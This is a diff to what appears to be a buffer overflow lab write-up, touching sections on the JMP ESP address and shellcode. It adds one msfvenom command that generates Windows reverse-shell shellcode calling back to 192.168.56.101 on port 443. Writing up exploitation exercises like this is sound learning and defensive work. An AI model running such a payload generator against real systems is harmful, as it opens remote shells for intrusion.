@@ -150,7 +150,7 @@ Setting JMP ESP address and shellcode
 
 `0x31170000` <- no ASLR
 
-
+`msfvenom -p windows/shell_reverse_tcp lhost=192.168.56.101 lport 443 -f c -o shellcode.txt -b "\x00"`
 ## Conclusion and benefits
 It was an opportunity to improve
 - scripting skills
